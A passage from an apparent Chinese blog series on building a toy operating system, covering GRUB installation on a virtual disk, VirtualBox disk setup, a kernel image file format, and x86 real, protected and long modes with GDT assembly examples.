<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo grub-install --boot-directory=./hdisk/boot/ --force --allow-floppy /dev/loop19</span><br><span class="line">Installing <span class="keyword">for</span> i386-pc platform.</span><br><span class="line">grub-install: warning: File system `ext2<span class="string">&#x27; doesn&#x27;</span>t support embedding.</span><br><span class="line">grub-install: warning: Embedding is not possible.  GRUB can only be installed <span class="keyword">in</span> this setup by using blocklists.  However, blocklists are UNRELIABLE and their use is discouraged..</span><br><span class="line">Installation finished. No error reported.</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><code>--boot-directory</code> : 指向先前我们在虚拟硬盘中建立的 boot 目录。</li>
<li><code>--force --allow-floppy</code> : 指向我们的虚拟硬盘设备文件 <code>/dev/loop19</code>。</li>
</ul>
<p>可以看到，现在 <code>hdisk/boot/</code> 目录下多了一个 grub 目录，表示我们的 GRUB 安装成功。请注意，这里还要在 <code>hdisk/boot/grub/</code> 目录下建立一个 <code>grub.cfg</code> 文本文件，GRUB 正是通过这个文件内容，查找到我们的操作系统映像文件的。</p>
<p>我们需要在这个文件里写入如下内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menuentry <span class="string">&#x27;HelloOS&#x27;</span> &#123;</span><br><span class="line">insmod part_msdos</span><br><span class="line">insmod ext2</span><br><span class="line"><span class="built_in">set</span> root=<span class="string">&#x27;hd0,msdos1&#x27;</span>         <span class="comment">#我们的硬盘只有一个分区所以是&#x27;hd0,msdos1&#x27;</span></span><br><span class="line">multiboot2 /boot/HelloOS.eki  <span class="comment">#加载boot目录下的HelloOS.eki文件</span></span><br><span class="line">boot                          <span class="comment">#引导启动</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span> timeout_style=menu</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;timeout&#125;</span>&quot;</span> = 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">set</span> <span class="built_in">timeout</span>=10              <span class="comment">#等待10秒钟自动启动</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="转换虚拟硬盘格式"><a href="#转换虚拟硬盘格式" class="headerlink" title="转换虚拟硬盘格式"></a>转换虚拟硬盘格式</h3><p>虚拟机提供了专用的转换格式的工具，我们只要输入一行命令即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ VBoxManage convertfromraw ./hd.img --format VDI ./hd.vdi</span><br><span class="line">Converting from raw image file=<span class="string">&quot;./hd.img&quot;</span> to file=<span class="string">&quot;./hd.vdi&quot;</span>...</span><br><span class="line">Creating dynamic image with size 104857600 bytes (100MB)...</span><br></pre></td></tr></table></figure>
<ul>
<li><code>convertfromraw</code> : 指向原始格式文件。</li>
<li><code>--format VDI</code> : 表示转换成虚拟需要的 VDI 格式。</li>
</ul>
<h3 id="安装虚拟硬盘"><a href="#安装虚拟硬盘" class="headerlink" title="安装虚拟硬盘"></a>安装虚拟硬盘</h3><p>直接使用下面的命令安装虚拟硬盘。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步 SATA 的硬盘其控制器是 intelAHCI</span></span><br><span class="line">VBoxManage storagectl HelloOS --name <span class="string">&quot;SATA&quot;</span> --add sata --controller IntelAhci --portcount 1</span><br><span class="line"><span class="comment"># 第二步 删除虚拟硬盘UUID并重新分配</span></span><br><span class="line">VBoxManage closemedium disk ./hd.vdi</span><br><span class="line"><span class="comment"># 第三步 将虚拟硬盘挂到虚拟机的硬盘控制器</span></span><br><span class="line">VBoxManage storageattach HelloOS --storagectl <span class="string">&quot;SATA&quot;</span> --port 1 --device 0 --<span class="built_in">type</span> hdd --medium ./hd.vdi</span><br></pre></td></tr></table></figure>
<p>这里也可以通过 VirtualBox 设置进行操作，选择 HelloOS 进入 settings 界面，选中 Storage，在 Storage Devices 中添加之前的虚拟硬盘 <code>hd.vdi</code> 。</p>
<h3 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h3><p>以上所有设置完成后，可以执行下面的命令启动虚拟机，也可以通过 VirtualBox 界面进行启动。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VBoxManage startvm HelloOS </span><br></pre></td></tr></table></figure>
<p>启动完成后，出现下面的界面即表示我们的虚拟机创建成功了。</p>
<img src="/2021/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9802-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%AF%E5%8A%A8.png" class="">

<h1 id="内核映像格式"><a href="#内核映像格式" class="headerlink" title="内核映像格式"></a>内核映像格式</h1><p>为了不让 GRUB 老哥加载多个文件，我们决定让 GRUB 只加载一个文件。这个文件我们称为内核映像文件，其中包含二级引导器的模块，内核模块，图片和字库文件。为了这映像文件能被 GRUB 加载，并让它自身能够解析其中的内容，我们就要定义好具体的格式。如下图所示。</p>
<img src="/2021/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9802-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/%E5%86%85%E6%A0%B8%E6%98%A0%E5%83%8F%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.png" class="">

<p>映像文件头描述符和文件描述符是两个 C 语言结构体，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//映像文件头描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_mlosrddsc</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">u64_t</span> mdc_mgic;             <span class="comment">//映像文件标识</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_sfsum;            <span class="comment">//未使用</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_sfsoff;           <span class="comment">//未使用</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_sfeoff;           <span class="comment">//未使用</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_sfrlsz;           <span class="comment">//未使用</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_ldrbk_s;          <span class="comment">//映像文件中二级引导器的开始偏移</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_ldrbk_e;          <span class="comment">//映像文件中二级引导器的结束偏移</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_ldrbk_rsz;        <span class="comment">//映像文件中二级引导器的实际大小</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_ldrbk_sum;        <span class="comment">//映像文件中二级引导器的校验和</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_fhdbk_s;          <span class="comment">//映像文件中文件头描述的开始偏移</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_fhdbk_e;          <span class="comment">//映像文件中文件头描述的结束偏移</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_fhdbk_rsz;        <span class="comment">//映像文件中文件头描述的实际大小</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_fhdbk_sum;        <span class="comment">//映像文件中文件头描述的校验和</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_filbk_s;          <span class="comment">//映像文件中文件数据的开始偏移</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_filbk_e;          <span class="comment">//映像文件中文件数据的结束偏移</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_filbk_rsz;        <span class="comment">//映像文件中文件数据的实际大小</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_filbk_sum;        <span class="comment">//映像文件中文件数据的校验和</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_ldrcodenr;        <span class="comment">//映像文件中二级引导器的文件头描述符的索引号</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_fhdnr;            <span class="comment">//映像文件中文件头描述符有多少个</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_filnr;            <span class="comment">//映像文件中文件头有多少个</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_endgic;           <span class="comment">//映像文件结束标识</span></span><br><span class="line">    <span class="type">u64_t</span> mdc_rv;               <span class="comment">//映像文件版本</span></span><br><span class="line">&#125;<span class="type">mlosrddsc_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FHDSC_NMAX 192          <span class="comment">//文件名长度</span></span></span><br><span class="line"><span class="comment">//文件头描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_fhdsc</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">u64_t</span> fhd_type;             <span class="comment">//文件类型</span></span><br><span class="line">    <span class="type">u64_t</span> fhd_subtype;          <span class="comment">//文件子类型</span></span><br><span class="line">    <span class="type">u64_t</span> fhd_stuts;            <span class="comment">//文件状态</span></span><br><span class="line">    <span class="type">u64_t</span> fhd_id;               <span class="comment">//文件id</span></span><br><span class="line">    <span class="type">u64_t</span> fhd_intsfsoff;        <span class="comment">//文件在映像文件位置开始偏移</span></span><br><span class="line">    <span class="type">u64_t</span> fhd_intsfend;         <span class="comment">//文件在映像文件的结束偏移</span></span><br><span class="line">    <span class="type">u64_t</span> fhd_frealsz;          <span class="comment">//文件实际大小</span></span><br><span class="line">    <span class="type">u64_t</span> fhd_fsum;             <span class="comment">//文件校验和</span></span><br><span class="line">    <span class="type">char</span>   fhd_name[FHDSC_NMAX];<span class="comment">//文件名</span></span><br><span class="line">&#125;<span class="type">fhdsc_t</span>;</span><br></pre></td></tr></table></figure>
<p>有了映像文件格式，我们还要有个打包映像的工具，这里直接使用作者提供的 lmoskrlimg 打包工具，使用方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lmoskrlimg -m k -lhf GRUB头文件 -o 映像文件 -f 输入的文件列表</span><br></pre></td></tr></table></figure>
<p>参数功能：</p>
<ul>
<li><code>-m</code> : 表示模式 只能是 <code>k</code> 内核模式。</li>
<li><code>-lhf</code> : 表示后面跟上 GRUB 头文件。</li>
<li><code>-o</code> : 表示输出的映像文件名。</li>
<li><code>-f</code> : 表示输入文件列表。</li>
</ul>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lmoskrlimg -m k -lhf grubhead.bin -o kernel.img -f file1.bin file2.bin file3.bin file4.bin </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战03-CPU工作模式</title>
    <url>/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="CPU工作模式"><a href="#CPU工作模式" class="headerlink" title="CPU工作模式"></a>CPU工作模式</h1><h2 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h2><p>实模式又称实地址模式，在该模式下可以执行所有的指令，并且可以直接访问物理内存。计算机每次通电或重置都会进入到实模式。</p>
<h3 id="实模式寄存器"><a href="#实模式寄存器" class="headerlink" title="实模式寄存器"></a>实模式寄存器</h3><p>x86 CPU 在实模式下的寄存器如下表所示，表中所有的寄存器都是 16 位的。</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>AX、BX、CX、DX、DI、SI、BP</td>
<td>通用寄存器，可以存放数据、地址，参与运算。</td>
</tr>
<tr>
<td>IP</td>
<td>程序指针寄存器，始终指向下一条指令的地址。</td>
</tr>
<tr>
<td>SP</td>
<td>栈指针寄存器，始终指向当前栈顶。</td>
</tr>
<tr>
<td>CS、DS、ES、SS</td>
<td>段寄存器，里面存放一个内存段的基地址。</td>
</tr>
<tr>
<td>EFLAGS</td>
<td>CPU 标志寄存器，里面存放 CPU 执行运算指令产生的状态位。</td>
</tr>
</tbody></table>
<h3 id="实模式下访问内存"><a href="#实模式下访问内存" class="headerlink" title="实模式下访问内存"></a>实模式下访问内存</h3><p>实模式下所有的内存地址都是由段寄存器左移 4 位，再加上一个通用寄存器中的值或者常数形成地址，然后通过这个地址去访问内存，这就是大名鼎鼎的分段内存管理模式，在这种模式下可以访问 2^20（1MB） 的内存大小。可以阅读王爽的《汇编语言》了解相关的知识。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E8%AE%BF%E9%97%AE%E5%86%85%E5%AD%98.png" class="">

<h3 id="实模式中断"><a href="#实模式中断" class="headerlink" title="实模式中断"></a>实模式中断</h3><p>中断即中止执行当前程序，转而跳转到另一个特定的地址上，去运行特定的代码。在实模式下它的实现过程是先保存 CS 和 IP 寄存器，然后装载新的 CS 和 IP 寄存器，这里有点类似函数调用。</p>
<p>中断分为硬件中断和软件中断，硬件中断：可简单理解为和 CPU 关联的外部设备产生的中断。软中断是通过 int 指令引起的中断处理。</p>
<p>为了实现中断，就需要在内存中放一个中断向量表，这个表的地址和长度由 CPU 的特定寄存器 IDTR 指向。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%AD%E6%96%AD%E8%A1%A8.png" class="">

<p>有了中断号以后，CPU 就能根据 IDTR 寄存器中的信息，计算出中断向量中的条目，进而装载 CS、IP寄存器，最终响应中断。</p>
<h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><h3 id="保护模式寄存器"><a href="#保护模式寄存器" class="headerlink" title="保护模式寄存器"></a>保护模式寄存器</h3><p>保护模式相比于实模式，增加了一些控制寄存器和段寄存器，扩展通用寄存器的位宽，所有的通用寄存器都是 32 位的，还可以单独使用低 16 位，这个低 16 位又可以拆分成两个 8 位寄存器，如下表。</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>EAX、EBX、ECX、EDX、EDI、ESI、EBP</td>
<td>32 位通用寄存器，可以存放数据、地址、参与运算</td>
</tr>
<tr>
<td>EIP</td>
<td>32 位程序指针寄存器，始终指向下一条指令的地址</td>
</tr>
<tr>
<td>ESP</td>
<td>栈指针寄存器，始终指向当前栈顶</td>
</tr>
<tr>
<td>CS、DS、ES、SS、FS、GS</td>
<td>16 位寄存器，里面存放一个内存段的段描述符索引</td>
</tr>
<tr>
<td>EFLAGS</td>
<td>32 位 CPU 标志寄存器，里面存放 CPU 执行运算指令产生的状态位</td>
</tr>
<tr>
<td>CR0、CR1、CR2、CR3</td>
<td>32 位 CPU 控制寄存器，控制 CPU 的功能控制特性，如开启保护模式等</td>
</tr>
</tbody></table>
<h3 id="保护模式特权级"><a href="#保护模式特权级" class="headerlink" title="保护模式特权级"></a>保护模式特权级</h3><p>为了区分哪些指令（如 in、out、cli）和哪些资源（如寄存器、I&#x2F;O 端口、内存地址）可以被访问，CPU 实现了特权级。特权级分为 4 级，R0~R3，我们只需要关注 R0 和 R3 。</p>
<h3 id="保护模式段描述符"><a href="#保护模式段描述符" class="headerlink" title="保护模式段描述符"></a>保护模式段描述符</h3><p>由于 CPU 的扩展导致了 32 位的段基地址和段内偏移，还有一些其它信息，所以 16 位的段寄存器肯定放不下。放不下就要找内存借空间，然后把描述一个段的信息封装成特定格式的段描述符，放在内存中，其格式如下。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6.png" class="">

<p>一个段描述符有 64 位 8 字节数据，里面包含了段基地址、段长度、段权限、段类型（可以是系统段、代码段、数据段）、段是否可读写，可执行等。</p>
<p>多个段描述符在内存中形成全局段描述符表，该表的基地址和长度由 CPU 和 GDTR 寄存器指示。如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8.png" class="">

<p>访问一个内存地址时，段寄存器中的索引首先会结合 GDTR 寄存器找到内存中的段描述符，再根据其中的段信息判断能不能访问成功。</p>
<h3 id="保护模式段选择子"><a href="#保护模式段选择子" class="headerlink" title="保护模式段选择子"></a>保护模式段选择子</h3><p>CS、DS、ES、SS、FS、GS 这些段寄存器它们是由影子寄存器、段描述符索引、描述符表索引、权限级别组成的。如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E6%AE%B5%E9%80%89%E6%8B%A9%E5%AD%90.png" class="">

<p>影子寄存器是靠硬件来操作的，对系统程序员不可见，是硬件为了减少性能损耗而设计的一个段描述符的高速缓存，不然每次内存访问都要去内存中查表，那性能损失是巨大的，影子寄存器也正好是 64 位，里面存放了 8 字节段描述符数据。</p>
<p>低三位之所以能放 TI 和 RPL，是因为段描述符 8 字节对齐，每个索引低 3 位都为 0，我们不用关注 LDT，只需要使用 GDT 全局描述符表，所以 TI 永远设为 0。</p>
<p>通常情况下，CS 和 SS 中 RPL 就组成了 CPL（当前权限级别），所以常常是 RPL&#x3D;CPL，进而 CPL 就表示发起访问者要以什么权限去访问目标段，当 CPL 大于目标段 DPL 时，则 CPU 禁止访问，只有 CPL 小于等于目标段 DPL 时才能访问。</p>
<blockquote>
<p>CPL: Current Privilege Level<br>RPL: Request Privilege Level<br>DPL: Descriptor Privilege Level</p>
</blockquote>
<h3 id="保护模式平坦模型"><a href="#保护模式平坦模型" class="headerlink" title="保护模式平坦模型"></a>保护模式平坦模型</h3><p>x86 CPU 并不能直接使用分页模型，而是要在分段模型的前提下，根据需要决定是否要开启分页。因为这是硬件的规定，程序员是无法改变的。但是我们可以简化设计，来使分段成为一种“虚设”，这就是保护模式的平坦模型。</p>
<p>根据前面的描述，我们发现 CPU 32 位的寄存器最多只能产生 4GB 大小的地址，而一个段长度也只能是 4GB，所以我们把所有段的基地址设为 0，段的长度设为 0xFFFFF，段长度的粒度设为 4KB，这样所有的段都指向同一个（0~4GB-1）字节大小的地址空间。</p>
<p>这里看一下 Hello OS 中段描述符表</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq <span class="number">0</span></span><br><span class="line">;第一个段描述符CPU硬件规定必须为<span class="number">0</span></span><br><span class="line">kcode_dsc: dq <span class="number">0x00cf9e000000ffff</span></span><br><span class="line">;段基地址=<span class="number">0</span>，段长度=<span class="number">0xfffff</span></span><br><span class="line">;G=<span class="number">1</span>,D/B=<span class="number">1</span>,L=<span class="number">0</span>,AVL=<span class="number">0</span> </span><br><span class="line">;P=<span class="number">1</span>,DPL=<span class="number">0</span>,S=<span class="number">1</span></span><br><span class="line">;T=<span class="number">1</span>,C=<span class="number">1</span>,R=<span class="number">1</span>,A=<span class="number">0</span></span><br><span class="line">kdata_dsc: dq <span class="number">0x00cf92000000ffff</span></span><br><span class="line">;段基地址=<span class="number">0</span>，段长度=<span class="number">0xfffff</span></span><br><span class="line">;G=<span class="number">1</span>,D/B=<span class="number">1</span>,L=<span class="number">0</span>,AVL=<span class="number">0</span> </span><br><span class="line">;P=<span class="number">1</span>,DPL=<span class="number">0</span>,S=<span class="number">1</span></span><br><span class="line">;T=<span class="number">0</span>,C=<span class="number">0</span>,R=<span class="number">1</span>,A=<span class="number">0</span></span><br><span class="line">GDT_END:</span><br><span class="line"></span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLEN  dw GDT_END-GDT_START<span class="number">-1</span></span><br><span class="line">GDTBASE  dd GDT_START</span><br></pre></td></tr></table></figure>
<p>上面代码中注释已经很明白了，段长度需要和 G 位配合，若 G 位为 1 则段长度等于 0xfffff 个 4KB。上面段描述符的 DPL&#x3D;0，这说明需要最高权限即 CPL&#x3D;0 才能访问。</p>
<h3 id="保护模式中断"><a href="#保护模式中断" class="headerlink" title="保护模式中断"></a>保护模式中断</h3><p>而保护模式下的中断要权限检查，还有特权级的切换，所以就需要扩展中断向量表的信息，即每个中断用一个中断门描述符来表示，也可以简称为中断门，中断门描述符依然有自己的格式，如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%AD%E6%96%AD%E9%97%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6.png" class="">

<p>同样的，保护模式要实现中断，也必须在内存中有一个中断向量表，同样是由 IDTR 寄存器指向，只不过中断向量表中的条目变成了中断门描述符，如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E6%AE%B5%E4%B8%AD%E6%96%AD%E8%A1%A8.png" class="">

<p>产生中断后，CPU 首先会检查中断号是否大于最后一个中断门描述符，x86 CPU 最大支持 256 个中断源（即中断号：0~255），然后检查描述符类型（是否是中断门或者陷阱门）、是否为系统描述符，是不是存在于内存中。</p>
<p>接着，检查中断门描述符中的段选择子指向的段描述符。</p>
<p>最后做权限检查，如果 CPL 小于等于中断门的 DPL 并且 CPL 大于等于中断门中的段选择子，就指向段描述符的 DPL。</p>
<p>进一步的，CPL 等于中断门中的段选择子指向段描述符的 DPL，则为同级权限不进行栈切换，否则进行栈切换。如果进行栈切换，还需要从 TSS 中加载具体权限的 SS、ESP，当然也要对 SS 中段选择子指向的段描述符进行检查。做完这一系列检查之后，CPU 才会加载中断门描述符中目标代码段选择子到 CS 寄存器中，把目标代码段偏移加载到 EIP 寄存器中。</p>
<h3 id="切换到保护模式"><a href="#切换到保护模式" class="headerlink" title="切换到保护模式"></a>切换到保护模式</h3><p>x86 CPU 在第一次加电和每次 reset 后，都会自动进入实模式，要想进入保护模式，就需要程序员写代码实现从实模式切换到保护模式。切换到保护模式的步骤如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 准备全局段描述符表</span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0</span><br><span class="line">kcode_dsc: dq 0x00cf9e000000ffff</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff</span><br><span class="line">GDT_END:</span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLEN  dw GDT_END-GDT_START-1</span><br><span class="line">GDTBASE  dd GDT_START</span><br><span class="line"></span><br><span class="line">; 加载设置 GDTR 寄存器，使之指向全局段描述符表</span><br><span class="line">lgdt [GDT_PTR]</span><br><span class="line"></span><br><span class="line">; 设置 CR0 寄存器，开启保护模式</span><br><span class="line">; 开启 PE</span><br><span class="line">mov eax, cr0</span><br><span class="line">bts eax, 0                      ; CR0.PE =1</span><br><span class="line">mov cr0, eax   </span><br><span class="line"></span><br><span class="line">; 进行长跳转，加载 CS 段寄存器，即段选择子</span><br><span class="line">jmp dword 0x8 :_32bits_mode ;_32bits_mode为32位代码标号即段偏移      </span><br></pre></td></tr></table></figure>

<h2 id="长模式"><a href="#长模式" class="headerlink" title="长模式"></a>长模式</h2><p>长模式又名 AMD64，因为这个标准是 AMD 公司最早定义的，它使 CPU 在现有的基础上有了 64 位的处理能力，既能完成 64 位的数据运算，也能寻址 64 位的地址空间。这在大型计算机上犹为重要，因为它们的物理内存通常有几百 GB。</p>
<h3 id="长模式寄存器"><a href="#长模式寄存器" class="headerlink" title="长模式寄存器"></a>长模式寄存器</h3><p>长模式相比于保护模式，增加了一些通用寄存器，并扩展通用寄存器的位宽，所有的通用寄存器都是 64 位，还可以单独使用低 32 位。</p>
<p>这个低 32 位可以拆分成一个低 16 位寄存器，低 16 位又可以拆分成两个 8 位寄存器，如下表。</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>RAX、RBX、RCX、RDX、RDI、RSI、RBP、R8~R15</td>
<td>64 位通用寄存器，可以存放数据、地址、参与运算</td>
</tr>
<tr>
<td>RIP</td>
<td>64 位程序指针寄存器，始终指向下一条指令的地址</td>
</tr>
<tr>
<td>RSP</td>
<td>栈指针寄存器，始终指向当前栈顶</td>
</tr>
<tr>
<td>CS、DS、ES、SS、FS、GS</td>
<td>16 位段寄存器，里面存放一个内存段的描述符索引</td>
</tr>
<tr>
<td>RFLAGS</td>
<td>64 位 CPU 标志寄存器，里面存放 CPU 执行运算指令产生的状态位</td>
</tr>
<tr>
<td>CR0、CR1、CR2、CR3、CR4</td>
<td>除了 CR0 仍是 32 位 CPU 控制寄存器，控制 CPU 的功能特性，其他都是64位寄存器</td>
</tr>
</tbody></table>
<h3 id="长模式段描述符"><a href="#长模式段描述符" class="headerlink" title="长模式段描述符"></a>长模式段描述符</h3><p>长模式依然具备保护模式绝大多数特性，如特权级和权限检查。相同的部分就不再重述了，这里只会说明长模式和保护模式下的差异。</p>
<p>下面我们来看看长模式下段描述的格式，如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E9%95%BF%E6%A8%A1%E5%BC%8F%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6.png" class="">

<p>在长模式下，CPU 不再对段基址和段长度进行检查，只对 DPL 进行相关的检查，这个检查流程和保护模式下一样。</p>
<p>当描述符中的 L&#x3D;1，D&#x2F;B&#x3D;0 时，就是 64 位代码段，DPL 还是 0~3 的特权级。然后有多个段描述在内存中形成一个全局段描述符表，同样由 CPU 的 GDTR 寄存器指向。</p>
<p>下面我们来写一个长模式下的段描述符表，加深一下理解，如下所示.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ex64_GDT:</span><br><span class="line">null_dsc:  dq <span class="number">0</span></span><br><span class="line">;第一个段描述符CPU硬件规定必须为<span class="number">0</span></span><br><span class="line">c64_dsc:dq <span class="number">0x0020980000000000</span>  ;<span class="number">64</span>位代码段</span><br><span class="line">;无效位填<span class="number">0</span></span><br><span class="line">;D/B=<span class="number">0</span>,L=<span class="number">1</span>,AVL=<span class="number">0</span> </span><br><span class="line">;P=<span class="number">1</span>,DPL=<span class="number">0</span>,S=<span class="number">1</span></span><br><span class="line">;T=<span class="number">1</span>,C=<span class="number">0</span>,R=<span class="number">0</span>,A=<span class="number">0</span></span><br><span class="line">d64_dsc:dq <span class="number">0x0000920000000000</span>  ;<span class="number">64</span>位数据段</span><br><span class="line">;无效位填<span class="number">0</span></span><br><span class="line">;P=<span class="number">1</span>,DPL=<span class="number">0</span>,S=<span class="number">1</span></span><br><span class="line">;T=<span class="number">0</span>,C/E=<span class="number">0</span>,R/W=<span class="number">1</span>,A=<span class="number">0</span></span><br><span class="line">eGdtLen   equ $ - null_dsc  ;GDT长度</span><br><span class="line">eGdtPtr:dw eGdtLen - <span class="number">1</span>  ;GDT界限</span><br><span class="line">     dq ex64_GDT</span><br></pre></td></tr></table></figure>
<p>上面代码中注释已经很清楚了，段长度和段基址都是无效的填充为 0，CPU 不做检查。但是上面段描述符的 DPL&#x3D;0，这说明需要最高权限即 CPL&#x3D;0 才能访问。若是数据段的话，G、D&#x2F;B、L 位都是无效的。</p>
<h3 id="长模式中断"><a href="#长模式中断" class="headerlink" title="长模式中断"></a>长模式中断</h3><p>保护模式下为了实现对中断进行权限检查，实现了中断门描述符，在中断门描述符中存放了对应的段选择子和其段内偏移，还有 DPL 权限，如果权限检查通过，则用对应的段选择子和其段内偏移装载 CS:EIP 寄存器。</p>
<p>如果你还记得中断门描述符，就会发现其中的段内偏移只有 32 位，但是长模式支持 64 位内存寻址，所以要对中断门描述符进行修改和扩展，下面我们就来看看长模式下的中断门描述符的格式，如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9803-CPU%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/%E9%95%BF%E6%A8%A1%E5%BC%8F%E4%B8%AD%E6%96%AD%E9%97%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6.png" class="">

<p>结合上图，我们可以看出长模式下中断门描述符的格式变化。</p>
